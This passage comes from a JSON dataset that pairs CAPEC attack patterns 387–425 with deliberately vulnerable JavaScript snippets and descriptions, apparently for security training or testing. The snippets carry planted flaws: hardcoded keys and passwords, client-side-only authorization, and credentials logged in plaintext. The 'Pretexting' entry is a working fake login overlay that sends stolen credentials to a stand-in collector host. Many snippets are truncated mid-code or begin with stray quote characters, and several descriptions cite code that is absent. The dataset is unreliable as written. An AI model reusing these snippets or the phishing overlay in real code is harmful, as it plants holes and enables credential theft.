        "description": "This vulnerable code demonstrates a user profile page that allows navigation remapping through unvalidated parameters and client-side only security checks. It accepts a 'redirect' parameter without origin validation and renders user profile elements with modifiable navigation targets. The code lacks server-side validation, proper URL sanitization, and encryption of sensitive data transmission."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "// Client-side code\nconst userRole = localStorage.getItem('userRole');\nconst isAdmin = localStorage.getItem('isAdmin');\n\nfunction sendSecureMessage() {\n    const message = {\n        content: document.getElementById('message').value,\n        timestamp: Date.now(),\n        userRole: userRole,\n        isAdmin: isAdmin\n    };\n\n    fetch('/api/messages', {\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application/json'\n        },\n        body: JSON.stringify(message)\n    });\n}\n\nfunction checkUserPermissions() {\n    if(isAdmin === 'true') {\n        document.getElementById('adminPanel').style.display = 'block';\n        enableAdminFeatures();\n    }\n}",
        "description": "This vulnerable code demonstrates client-side security enforcement where user role and admin status are stored in localStorage and can be easily modified. The code assumes these client-side values are trustworthy and uses them to make security decisions and send messages to the server without proper origin validation or data authenticity verification. The sensitive data is transmitted without encryption, and the immutable properties (userRole, isAdmin) can be manipulated by users through browser dev tools."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "const buttonConfig = {\n  text: 'Click to Login',\n  destination: 'https://login.example.com/auth'\n};\n\nfunction createButton() {\n  const button = document.createElement('button');\n  button.textContent = buttonConfig.text;\n  button.onclick = () => {\n    window.location.href = buttonConfig.destination;\n  };\n  document.body.appendChild(button);\n}\n\n// Client-side validation only\nfunction validateButtonConfig(config) {\n  return config.destination.includes('example.com');\n}\n\n// Vulnerable to modification\nwindow.addEventListener('message', (event) => {\n  const newConfig = event.data;\n  if(validateButtonConfig(newConfig)) {\n    Object.assign(buttonConfig, newConfig);\n    createButton();\n  }\n});",
        "description": "This code demonstrates vulnerability to button manipulation by relying solely on client-side validation and using mutable configuration data. The button's destination can be modified through postMessage events, lacking proper origin validation and encryption. The configuration is assumed immutable but can be altered by an attacker, potentially redirecting users to malicious sites."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "`\nconst clientAPI = {\n  authenticate: function(clientToken) {\n    // Client-side only authentication\n    if (clientToken) {\n      localStorage.setItem('authToken', clientToken);\n      return true;",
        "description": "\"This vulnerable code implements a client-side API with multiple security flaws: authentication is performed only on the client side, there's no message integrity verification, and content validation is done purely client-side. An attacker can bypass authentication by modifying the client code, inject malicious content by manipulating the message data, and perform replay attacks due to the lack of proper message signing or verification mechanisms.\""
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "`\n    class SecuritySystem {\n      constructor() {\n        this.locked = true;\n        this.voltage = 5.0;\n        this.alarmActive = true;\n        this.lastEMReading = 0;",
        "description": "\"A vulnerable physical security system implementation that fails to properly protect against voltage glitching, electromagnetic interference, and physical side-channel attacks. The code exposes sensitive timing information, lacks proper voltage monitoring, stores security logs insecurely, and implements weak alert mechanisms that can be bypassed.\""
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "`\nclass SecuritySystem {\n  constructor() {\n    this.locked = true;\n    this.debugMode = false;\n    this.lockBit = 1;\n    this.accessLog = [];",
        "description": "\"A vulnerable implementation of a security system that demonstrates multiple physical access control weaknesses, including modifiable lock bits, debug mode bypasses, and insufficient access controls. The code allows unauthorized manipulation of security states and lacks proper verification of physical access attempts.\""
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "`\nclass SecureLockSystem {\n  constructor() {\n    this.lockBit = false;\n    this.MASTER_KEY = \"0xDEADBEEF\"; // Hard-coded master key\n    this.failedAttempts = {",
        "description": "\"This vulnerable code simulates a digital lock system with multiple security flaws including a hard-coded master key, mutable lock bits after power state transitions, insufficient address region protection, and an overly restrictive account lockout mechanism. Similar to physical lock bumping, the system can be compromised through the exploitation of these vulnerabilities.\""
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "`\nclass SecurityLock {\n  constructor() {\n    this.locked = false;\n    this.lockBit = false;\n    this.pin = '0000';\n    this.lockControls = new Map();",
        "description": "\"This code represents a vulnerable security lock implementation that simulates physical lock picking through software. It contains multiple security flaws including modifiable lock bits, insufficient access controls, potential deadlocks, and improper lock state management.\""
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "class ElectronicLock {\n    constructor() {\n        this.lockBits = new Uint8Array(8);\n        this.isLocked = true;\n        this.defaultKey = '0000';\n        this.powerState = 'active';\n        this.lockQueue = [];\n    }\n\n    async attemptUnlock(pin) {\n        if (this.powerState === 'sleep') {\n            this.lockBits.fill(0); // Lock bits become modifiable in sleep state\n            return true;\n        }\n\n        if (pin === this.defaultKey) { // Using default key\n            return true;\n        }\n\n        // Simulating concurrent access that could lead to deadlock\n        return new Promise((resolve) => {\n            this.lockQueue.push(async () => {\n                // Vulnerable: All lock bits can be modified at once\n                this.lockBits.fill(1);\n                this.isLocked = false;\n                resolve(true);\n            });\n        });\n    }\n\n    setPowerState(state) {\n        this.powerState = state;\n        // Lock bits protection is lost after power state change\n        if (state === 'sleep') {\n            this.lockBits = new Uint8Array(8);\n        }\n    }\n}",
        "description": "A vulnerable electronic lock implementation that demonstrates multiple security issues including default key usage, improper lock bit protection, insufficient granularity in lock controls, and potential deadlocks in concurrent access. The lock bits become modifiable during power state transitions and the system uses a default key, making it susceptible to unauthorized access."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "`\nconst HARDCODED_KEY = '1234567890ABCDEF';  // Hardcoded crypto key\nconst WEAK_ALGO = 'DES';  // Weak encryption algorithm\n\nclass AccessControlSystem {\n  constructor() {\n    this.crypto = require('crypto');\n    this.authorizedCards = new Map();",
        "description": "\"This code demonstrates multiple security vulnerabilities in an electronic access control system including use of a hardcoded cryptographic key, weak encryption algorithm (DES), and lack of protection against card cloning or replay attacks. The system relies solely on basic card validation without implementing additional security measures like challenge-response mechanisms or protection against physical side-channel attacks.\""
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "const authenticateCard = (cardData) => {\n  // Simple XOR encryption - weak crypto (CWE-327)\n  const encryptData = (data) => {\n    const key = 'secretkey';\n    return data.split('').map((char, i) => \n      String.fromCharCode(char.charCodeAt(0) ^ key.charCodeAt(i % key.length))\n    ).join('');\n  };\n\n  // Store encrypted card data in memory\n  let storedCardData = encryptData('4532016378904532');\n\n  // Vulnerable to replay attacks (CWE-294)\n  function verifyCard(inputData) {\n    return encryptData(inputData) === storedCardData;\n  }\n\n  // No protection against spoofing (CWE-290)\n  if(verifyCard(cardData)) {\n    return { authenticated: true, access: 'granted' };\n  }\n  return { authenticated: false, access: 'denied' };\n}",
        "description": "This code demonstrates vulnerable card authentication that is susceptible to spoofing, replay attacks, and uses weak cryptography. It lacks proper card data validation, implements weak encryption, and doesn't protect against capture-replay attacks. The authentication can be bypassed by replaying captured card data."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "`\nclass MagneticCard {\n  constructor(cardNumber, pinCode, accessLevel) {\n    this.cardNumber = cardNumber;\n    this.pinCode = pinCode;\n    this.accessLevel = accessLevel;\n    this.encryptionKey = 'simple_key_123'; // Weak encryption key",
        "description": "\"This code demonstrates vulnerable magnetic card implementation with multiple security issues: cloneable class containing sensitive information, weak cryptographic algorithm for data encoding, and no protection against card duplication. The class allows direct cloning of card data and uses a simplistic encryption method, making it easy for attackers to duplicate cards and gain unauthorized access.\""
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "`\n// Vulnerable magnetic stripe card processing system\nclass MagneticCardProcessor {\n    constructor() {\n        // Hard-coded encryption key (CWE-321)\n        this.encryptionKey = \"1234567890abcdef\";\n        this.maxAttempts = 999999; // No real limit on authentication attempts (CWE-307)",
        "description": "\"This code demonstrates a vulnerable magnetic card processing system that uses weak encryption, hard-coded keys, lacks proper authentication attempt limits, has no protection against electromagnetic attacks, and implements poor validation logic that could be exploited through card spoofing.\""
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "class RFIDReader {\n    constructor() {\n        this.validCards = new Map();\n    }\n\n    addCard(id, data) {\n        // Vulnerable: Multiple cards can share same ID\n        this.validCards.set(id, data);\n    }\n\n    verifyAccess(rfidSignal) {\n        // Vulnerable: Simple direct comparison of signals\n        // No protection against cloning or replay attacks\n        const signalData = this.decodeRFID(rfidSignal);\n        return this.validCards.has(signalData.id);\n    }\n\n    decodeRFID(signal) {\n        // Vulnerable: Basic decoding without security checks\n        // No protection against EM-FI attacks\n        return {\n            id: signal.substring(0, 8),\n            timestamp: signal.substring(8, 16)\n        };\n    }\n\n    validateTransaction(cardId, zone) {\n        // Vulnerable: No verification of signal authenticity\n        if(this.validCards.has(cardId)) {\n            return true;\n        }\n        return false;\n    }\n}",
        "description": "This code demonstrates vulnerable RFID card processing that's susceptible to cloning attacks. It lacks proper security identifier verification, allows duplicate IDs, has no protection against electromagnetic fault injection, and implements basic signal comparison that could be easily replicated. The code doesn't implement any challenge-response mechanism or cryptographic protection, making it vulnerable to replay attacks and signal duplication."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "`\n    class RFIDController {\n      constructor() {\n        this.isEnabled = true;\n        this.debugMode = true;\n        this.securityIdentifier = '';",
        "description": "\"Vulnerable RFID controller implementation that allows unauthorized debug access, improper security identifier decoding, insufficient data scrubbing during decommissioning, and susceptibility to error injection attacks that can disable the tag. The code lacks proper access controls and error handling mechanisms.\""
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "\"// Hardware management interface\nclass HardwareController {\n    constructor() {\n        this.debugMode = false;\n        this.powerLevel = 100;",
        "description": "\"This code demonstrates vulnerable hardware access control by allowing unrestricted debug mode activation, unprotected clock/power management, and direct hardware register manipulation without proper authentication or protection against physical tampering. It lacks voltage glitch detection and side-channel attack protections, making it susceptible to hardware-level exploitation.\""
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "`\nclass DiskController {\n  constructor() {\n    this.password = 'admin123';  // Hard-coded password\n    this.isLocked = false;",
        "description": "\"This vulnerable code demonstrates weak ATA security implementation where the password protection can be bypassed. It includes hard-coded credentials, improper authorization checks, and allows password changes without proper authentication. The hotSwapDrive function simulates the ability to bypass security by resetting the drive state, similar to physically moving the drive to a system without ATA security.\""
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "function authenticateUser(username, password) {\n  // DNS lookup for authentication server\n  dns.lookup('auth.example.com', (err, address) => {\n    if (err) return false;\n    \n    // Store sensitive data without encryption\n    const userData = {\n      username: username,\n      password: password,\n      loginTime: new Date()\n    };\n    \n    // Log sensitive information\n    console.log(`Login attempt: ${JSON.stringify(userData)}`);\n    fs.appendFileSync('server.log', JSON.stringify(userData));\n    \n    // Insecure authentication check\n    if (username.length > 0 && password.length > 0) {\n      return true;\n    }\n    return false;\n  });\n}",
        "description": "This code demonstrates multiple security vulnerabilities including reliance on DNS lookups for security decisions, improper storage of sensitive data, weak authentication mechanisms, and exposure of sensitive information through logging. It represents a collection of deprecated security anti-patterns that could be exploited for information gathering and authentication bypass."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "function authenticate(username, password) {\n  // Insecure DNS lookup for authentication\n  dns.lookup(username + '.auth.example.com', (err, address) => {\n    if (!err) {\n      // Store sensitive data without encryption\n      let userData = {\n        username: username,\n        password: password,\n        loginTime: new Date()\n      };\n      fs.writeFileSync('userlog.txt', JSON.stringify(userData));\n      \n      // Log sensitive information\n      console.log('Login successful for: ' + username + ' from ' + address);\n      return true;\n    }\n    return false;\n  });\n}",
        "description": "A vulnerable authentication implementation that relies on DNS lookups for security decisions, stores sensitive data without protection, and exposes information through logs. The code demonstrates multiple deprecated security practices including authentication bypass possibilities and insufficient data protection."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "class DataManagement {\n    constructor() {\n        this.userRecords = [];\n        this.tempFiles = [];\n    }\n\n    storeUserData(userData) {\n        // Store sensitive data in cleartext\n        this.userRecords.push({\n            ssn: userData.ssn,\n            creditCard: userData.creditCard,\n            password: userData.password\n        });\n    }\n\n    generateTempFiles() {\n        // Create temporary debug files with sensitive data\n        const debugInfo = {\n            users: this.userRecords,\n            systemLogs: process.env,\n            databaseCredentials: 'db_password_123'\n        };\n        this.tempFiles.push(JSON.stringify(debugInfo));\n    }\n\n    deleteUserData(userId) {\n        // Improper data deletion - just removes reference but data remains in memory\n        const index = this.userRecords.findIndex(user => user.id === userId);\n        if (index > -1) {\n            this.userRecords.splice(index, 1);\n        }\n    }\n\n    decommissionSystem() {\n        // Improper cleanup of sensitive data\n        this.userRecords = null;\n        this.tempFiles = null;\n        // No secure overwriting of data\n    }\n}",
        "description": "This code demonstrates multiple insecure data handling practices that could lead to sensitive information exposure through improper data disposal. It stores sensitive information in cleartext, creates debug files with sensitive data, improperly deletes user data leaving residual information in memory, and fails to properly sanitize data during system decommissioning. This makes sensitive information potentially recoverable through memory dumps, temporary files, or system artifacts."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "function loginPortal(sessionId) {\n  let userSession = sessionId || Math.random().toString(36);\n  \n  function displaySecureLogin() {\n    const fakeLoginForm = document.createElement('div');\n    fakeLoginForm.innerHTML = `\n      <div style='position:absolute;top:0;left:0;width:100%;height:100%;background:white;z-index:9999'>\n        <h2>Security Update Required</h2>\n        <p>Please re-enter your credentials to verify your identity</p>\n        <input type='text' id='username' placeholder='Username'>\n        <input type='password' id='password' placeholder='Password'>\n        <button onclick='sendCredentials()'>Login</button>\n      </div>\n    `;\n    document.body.appendChild(fakeLoginForm);\n  }\n\n  function sendCredentials() {\n    const credentials = {\n      username: document.getElementById('username').value,\n      password: document.getElementById('password').value,\n      session: userSession\n    };\n    \n    fetch('https://malicious-collector.com/collect', {\n      method: 'POST',\n      body: JSON.stringify(credentials)\n    });\n  }\n\n  // Inject fake security warning\n  displaySecureLogin();\n  return userSession;\n}",
        "description": "This vulnerable code creates a social engineering attack by injecting a fake login form that mimics a security update. It exploits session fixation by accepting an existing session ID, misrepresents UI elements to appear legitimate, creates an emergent resource through DOM manipulation, and exposes sensitive credentials to an unauthorized endpoint. The code demonstrates pretexting by creating a false scenario requiring user re-authentication."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "const fs = require('fs');\nconst dns = require('dns');\n\nfunction authenticateUser(username, ip) {\n  // Store sensitive data in plaintext log files\n  fs.appendFileSync('debug.log', `Login attempt from ${ip} for user ${username}\\n`);\n  \n  // Rely on DNS lookup for security decision\n  dns.reverse(ip, (err, hostnames) => {\n    if (hostnames && hostnames[0].endsWith('.trusted-domain.com')) {\n      // Store unencrypted user data\n      let userData = { username: username, lastLogin: new Date() };\n      fs.writeFileSync('users.dat', JSON.stringify(userData));\n      return true;\n    }\n    return false;\n  });\n}",
        "description": "This vulnerable code demonstrates multiple security issues: reliance on DNS lookups for security decisions, unprotected storage of sensitive data, and unsafe logging practices that could expose system information. The code fails to implement proper data protection, authentication mechanisms, and secure logging practices."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "function getUserData(username) {\n  // Unsafe reliance on DNS lookup for authentication\n  dns.resolve(username + '.trusted-domain.com', (err, records) => {\n    if (!err && records.length > 0) {\n      // Store sensitive data in plaintext log files\n      fs.appendFileSync('debug.log', `User data: ${JSON.stringify(userSecrets)}`)\n      \n      // Unprotected storage of sensitive information\n      let userData = {\n        password: 'plaintext_password',\n        ssn: '123-45-6789'\n      }\n      fs.writeFileSync('user_data.txt', JSON.stringify(userData))\n      \n      // Exposing sensitive info in server logs\n      console.log('Authentication success for user:', username)\n      console.log('Session token:', generateToken())\n      return userData\n    }\n  })\n}",
        "description": "Vulnerable code that demonstrates multiple security weaknesses including improper reliance on DNS for security decisions, failure to protect stored data, and exposure of sensitive information through debug and server logs."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "function authenticateUser(userInput) {\n    const adminEmail = 'admin@company.com';\n    const adminPhone = '555-0123';\n    \n    if (userInput.role === 'support') {\n        if (userInput.email.includes('helpdesk')) {\n            console.log('Processing support request...');\n            console.log('Admin contact:', adminEmail);\n            return true;\n        }\n    }\n    \n    if (userInput.urgency === 'critical') {\n        console.log('Emergency contact number:', adminPhone);\n        if (userInput.department?.length > 10) {\n            console.log('Internal system state:', getSystemState());\n            return true;\n        }\n    }\n    \n    return false;\n}\n\nfunction getSystemState() {\n    return {\n        activeUsers: ['admin', 'john', 'sarah'],\n        securityLevel: 'high',\n        internalKeys: ['key1', 'key2']\n    };\n}",
        "description": "This vulnerable code demonstrates social engineering susceptibility by leaking sensitive information through observable behaviors and improper verification. It reveals admin contact details and system state based on easily spoofable input parameters, and shows different behaviors based on input that could be used for information gathering. The code fails to properly validate the source of requests and exposes internal system details through verbose logging."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "const userCredentials = {\n  username: 'admin',\n  password: 'secretpass123'\n};\n\nfunction processLogin(user, pass) {\n  console.log(`Login attempt: ${user}:${pass}`);\n  fs.appendFileSync('server.log', `${new Date()} - Login: ${user}:${pass}\\n`);\n  \n  if(user === userCredentials.username && pass === userCredentials.password) {\n    console.log('Debug: Authentication successful');\n    return true;\n  }\n  return false;\n}",
        "description": "This vulnerable code demonstrates multiple security issues including sensitive information exposure through log files, authentication bypass risks, and improper storage of credentials. The code logs sensitive authentication details in plaintext to both console and file outputs, fails to implement proper authentication controls, and stores credentials in clear text within the code."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "// Customer service chat application\nconst handleCustomerSupport = (userRequest) => {\n    const customerId = userRequest.customerId;\n    const customerData = {\n        name: 'John Doe',\n        creditCard: '4111-1111-1111-1111',\n        ssn: '123-45-6789'\n    };\n\n    // No verification of caller's identity\n    if (userRequest.role === 'customer_service') {\n        // Immediately grant access to sensitive data before proper authentication\n        return {\n            status: 'success',\n            customerInfo: customerData,\n            allowedOperations: ['VIEW_ALL', 'MODIFY', 'EXPORT']\n        };\n    }\n\n    // Broadcast sensitive information over unsecured channel\n    window.postMessage({\n        type: 'CUSTOMER_DATA',\n        data: customerData\n    }, '*');\n}",
        "description": "This vulnerable code demonstrates a customer service system that fails to properly verify the identity of support representatives, exposes sensitive customer data, and broadcasts information over an insecure channel. It grants access to sensitive information based solely on an unverified role claim and broadcasts customer data without proper endpoint verification."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "// Fake tech support portal for collecting sensitive info\nconst supportPortal = {\n  userCredentials: new Map(),\n  logs: [],\n\n  handleSupportRequest: function(userId, requestType, userInput) {\n    // Store sensitive information in publicly accessible directory\n    const logPath = '/public/support_logs/';\n    \n    // Collect and store sensitive user data without validation\n    this.userCredentials.set(userId, {\n      password: userInput.password,\n      personalInfo: userInput.personalInfo,\n      systemAccess: userInput.systemAccess\n    });\n\n    // Allow unrestricted file uploads without validation\n    if(requestType === 'fileUpload') {\n      const uploadedFile = userInput.file;\n      const filePath = `/uploads/${uploadedFile.name}`;\n      // Direct file write without type checking or sanitization\n      fs.writeFileSync(filePath, uploadedFile.content);\n    }\n\n    // Expose collected data in plain text log files\n    this.logs.push(JSON.stringify({\n      userId: userId,\n      credentials: this.userCredentials.get(userId),\n      timestamp: new Date().toISOString()\n    }));\n\n    fs.appendFileSync(logPath + 'support_activity.log', this.logs.join('\\n'));\n  }\n};",
        "description": "This code represents a vulnerable tech support portal that demonstrates multiple security issues related to social engineering attacks. It improperly stores sensitive information in public directories, allows unrestricted file uploads, and exposes private user information. The code lacks proper authentication, input validation, and access controls, making it susceptible to exploitation through tech support impersonation scenarios."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "// Fake delivery tracking system with vulnerable authentication\nconst deliverySystem = {\n  trackingDatabase: new Map(),\n  sensitiveData: new Map(),\n\n  createDelivery: function(trackingId, details, securityToken) {\n    // No validation of security token or authentication\n    this.trackingDatabase.set(trackingId, {\n      details: details,\n      accessLog: `${details.deliveryPerson}.log`,\n      credentials: securityToken\n    });\n\n    // Writes sensitive tracking info to public directory\n    fs.writeFileSync(`/public/tracking/${trackingId}.txt`, \n      JSON.stringify(details));\n  },\n\n  validateDeliveryPerson: function(credentials) {\n    // Weak validation - accepts any credential format\n    return credentials && credentials.length > 0;\n  },\n\n  accessDeliveryInfo: function(trackingId, providedCredentials) {\n    if(this.validateDeliveryPerson(providedCredentials)) {\n      // No verification if credentials match original security token\n      return this.trackingDatabase.get(trackingId);\n    }\n  }\n}",
        "description": "This code demonstrates a vulnerable delivery tracking system that allows for impersonation through weak authentication, improper storage of sensitive data in publicly accessible directories, and insufficient validation of delivery personnel credentials. It embodies security issues where an attacker could pose as legitimate delivery personnel to access sensitive delivery information."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "`\n// Vulnerable authentication system for tech support\nconst supportAgents = new Map();\n\nfunction handleSupportCall(caller, requestedInfo) {\n    // No proper verification of caller identity\n    if (caller.claims_to_be_employee) {\n        // Directly trust caller's claimed identity\n        const employeeData = {\n            name: caller.claimed_name,\n            department: caller.claimed_department,\n            employeeId: caller.claimed_id",
        "description": "\"This code demonstrates a vulnerable help desk support system that fails to properly authenticate callers claiming to be IT support or employees. It blindly trusts caller-provided credentials and exposes sensitive information without proper verification, embodying social engineering vulnerabilities through pretexting attacks. The code lacks proper channel verification, reflects authentication weaknesses, and potentially exposes sensitive data to unauthorized actors.\""
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "class SupportSystem {\n    constructor() {\n        this.sensitiveData = {\n            'admin': { password: '1234', role: 'admin' },\n            'users': ['john', 'jane', 'bob'],\n            'serverConfig': { port: 8080, apiKeys: ['secret1', 'secret2'] }\n        };\n        this.loginAttempts = {};\n    }\n\n    async handleSupportRequest(user, query) {\n        // No rate limiting implemented\n        this.loginAttempts[user] = (this.loginAttempts[user] || 0) + 1;\n\n        if (query.includes('help') || query.includes('support')) {\n            // Reveals system information without proper verification\n            return `System Info:\\nUsers Online: ${this.sensitiveData.users.length}\\nServer Status: Active`;\n        }\n\n        if (query.includes('admin')) {\n            // Leaks information about admin existence\n            return 'Please contact system administrator for elevated access.';\n        }\n\n        // Information disclosure through error messages\n        if (this.sensitiveData.users.includes(user)) {\n            return `User ${user} found in system. What information do you need?`;\n        } else {\n            return `User ${user} not found. Please register first.`;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a support system that's susceptible to social engineering attacks through multiple vectors: information disclosure through detailed error messages and system responses, lack of rate limiting for interactions, observable behavioral differences based on input, and exposure of sensitive information through query responses. The system provides different responses based on input patterns, allowing attackers to gather intelligence about the system's internal state and user base."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "`\nconst userAuthentication = {\n    secretKey: 'abc123',  // Hidden but easily discoverable\n    lastLoginAttempt: null,\n    \n    authenticate: function(username, providedKey) {\n        this.lastLoginAttempt = { username, time: new Date()",
        "description": "\"This code implements an authentication system with multiple vulnerabilities including security through obscurity (hardcoded secret), observable timing behavior, truncation of security information, single-factor authentication, and reflection of user input. It enables social engineering by providing detailed error messages and observable behaviors that an attacker could exploit.\""
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "`\n    class UserAuthentication {\n      constructor() {\n        this.users = new Map();\n        this.pendingRequests = new Set();",
        "description": "\"Vulnerable authentication system that can be exploited through social engineering. The code accepts any request containing a compliment without proper source verification, allows reflection attacks through token manipulation, and truncates security tokens. It demonstrates improper channel verification and authentication vulnerabilities that can be exploited through social engineering techniques.\""
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "function authenticateUser(username, password) {\n  const weakHash = window.prompt('Use weak hash for faster login? (y/n)', 'n');\n  let hashMethod;\n  \n  if (weakHash === 'y') {\n    hashMethod = 'MD5';\n  } else {\n    hashMethod = 'SHA-256';\n  }\n\n  const startTime = performance.now();\n  let hashedPassword;\n  \n  try {\n    if (hashMethod === 'MD5') {\n      hashedPassword = MD5(password);\n    } else {\n      hashedPassword = SHA256(password);\n    }\n    const success = checkCredentials(username, hashedPassword);\n    return success;\n  } catch(e) {\n    return false;\n  } finally {\n    const endTime = performance.now();\n    // Timing information leaked through network response header\n    response.setHeader('X-Processing-Time', endTime - startTime);\n  }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including algorithm downgrade (CWE-757), observable timing differences (CWE-203/205), and information disclosure through headers. It allows users to choose weaker encryption, exposes processing time, and exhibits different behaviors that can be observed by attackers to infer system state."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "`\nfunction limitedTimeOffer(user) {\n  const currentTime = new Date().getTime();\n  const offerEndTime = currentTime + 300000; // 5 minutes\n  \n  let remainingSlots = Math.floor(Math.random() * 5) + 1;\n  \n  function checkAvailability() {\n    if (currentTime >= offerEndTime) {\n      return false;",
        "description": "\"A vulnerable implementation of a limited-time offer system that creates artificial scarcity to pressure users. The code contains multiple security issues including single-factor authentication, resource amplification vulnerabilities, information leakage, and truncation of security data.\""
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "`\nfunction authenticateUser(token, requestOrigin) {\n  // Vulnerable authentication system relying on single token\n  const validToken = 'admin_token_123';\n  const trustedOrigin = 'trusted-domain.com';\n  \n  // Does not properly verify request origin\n  if (token === validToken) {\n    let userRole = getUserRole(token);\n    \n    // Truncates role information to first 5 chars\n    userRole = userRole.substring(0, 5);\n    \n    if (userRole.includes('admin')) {\n      // Reflection vulnerability - echoes back authentication data\n      return {\n        status: 'authenticated',\n        originalToken: token,\n        userRole: userRole,\n        message: 'Welcome ' + userRole",
        "description": "\"This code demonstrates vulnerable authentication that relies on a single token factor, does not properly verify the communication channel origin, truncates security-relevant role information, and is susceptible to reflection attacks by echoing back authentication data. It impersonates authority through simple token matching without proper verification.\""
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "// Social engineering automation script\nconst userRequests = [];\nconst MAX_REQUESTS = 100;\n\nasync function handleUserRequest(request, userId) {\n    if (userRequests.length >= MAX_REQUESTS) {\n        return { status: 'error', message: 'Too many requests' };\n    }\n\n    let requestDifficulty = calculateDifficulty(request);\n    let userHistory = getUserHistory(userId);\n\n    // No rate limiting or proper origin verification\n    if (userHistory.length > 0) {\n        let lastRequest = userHistory[userHistory.length - 1];\n        if (requestDifficulty > lastRequest.difficulty) {\n            requestDifficulty = lastRequest.difficulty * 1.2;\n        }\n    }\n\n    // Observable behavior discrepancy\n    if (isAdmin(userId)) {\n        console.log('Admin request processed');\n        return processAdminRequest(request);\n    }\n\n    userRequests.push({\n        userId: userId,\n        timestamp: Date.now(),\n        difficulty: requestDifficulty,\n        request: request\n    });\n\n    return {\n        status: 'success',\n        nextSuggestion: generateNextRequest(requestDifficulty)\n    };\n}",
        "description": "This vulnerable code implements a request handling system that gradually escalates user requests without proper validation or rate limiting. It exposes different behaviors for different user types, lacks proper request origin verification, and allows for request frequency manipulation. The system can be exploited through social engineering by gradually increasing request complexity and observing system responses."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "`\n    class AuthenticationSystem {\n      constructor() {\n        this.trustedHosts = new Set();\n        this.sessionKey = 'secret123'; // Single hard-coded key",
        "description": "\"A vulnerable authentication system that relies on a single hard-coded key, exhibits reflection vulnerabilities, and leaks information through observable behavioral differences. The code demonstrates security through obscurity and reveals system state through different response patterns for trusted vs untrusted hosts.\""
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "function authenticateUser(username, password) {\n  // Behavioral discrepancy in login attempts\n  if (!users[username]) {\n    console.log('Checking user directory...');\n    sleep(1000);\n    return false;\n  }\n\n  if (users[username].password !== password) {\n    console.log('Validating credentials...');\n    sleep(500);\n    return false;\n  }\n\n  console.log('Login successful!');\n  return true;\n}\n\nfunction sleep(ms) {\n  const start = Date.now();\n  while(Date.now() - start < ms) {}\n}\n\nconst users = {\n  'admin': { password: 'admin123' },\n  'user': { password: 'password123' }\n};",
        "description": "This code demonstrates observable behavioral discrepancy in an authentication system. The timing differences and console messages reveal whether a username exists (longer delay) versus an incorrect password (shorter delay). This allows attackers to enumerate valid usernames through timing analysis and message observation, making the system vulnerable to user enumeration and subsequent targeted attacks."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "`\nfunction authenticateUser(username, password) {\n    // Single factor authentication relying only on password\n    let socialEngineeredUI = {\n        title: 'Secure Login',\n        message: 'Please verify your account',\n        input_field: 'Enter password to continue',\n        logo: 'trusted_bank_logo.png'",
